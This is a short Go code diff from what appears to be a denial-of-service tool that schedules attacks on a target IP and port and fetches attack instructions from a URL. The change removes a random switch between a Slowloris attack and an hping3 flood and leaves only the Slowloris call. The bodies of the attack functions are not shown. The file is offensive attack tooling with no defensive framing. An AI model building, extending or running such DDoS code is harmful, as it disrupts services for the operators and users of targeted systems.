@@ -80,24 +80,7 @@ func cronAttackDDoS(ip string, port string, date string, dateNs int64) {
 }
 
 func attackDDoS(ip string, port string) {
-	x := randomNumber(2)
-	fmt.Println(x)
-
-	//_, err := exec.Command("/bin/ping", "-c1", ip).Output()
-	//if err != nil {
-	//	log.Fatal(err)
-	//}
-	//fmt.Println(string(out))
-
-	switch x {
-	case 1:
-		fmt.Println("------------------------Starting Slowloris Attack------------------------")
-		slowloris(ip + ":" + port)
-	case 2:
-		fmt.Println("------------------------Starting hping3 flooding Attack------------------------")	
-		hping3(ip, port)
-	}
-
+	slowloris(ip + ":" + port)
 }
 
 func getAttackInfo(url string, target interface{}) error {
